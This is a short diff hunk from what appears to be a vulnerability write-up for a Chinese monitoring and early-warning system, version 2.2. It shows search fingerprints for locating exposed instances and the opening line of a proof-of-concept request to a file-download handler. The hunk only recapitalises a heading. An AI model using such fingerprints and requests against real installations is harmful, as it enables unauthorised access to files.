@@ -12,7 +12,7 @@ app="华测监测预警系统2.2"
 icon_hash="-628229493"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /Handler/FileDownLoad.ashx HTTP/1.1
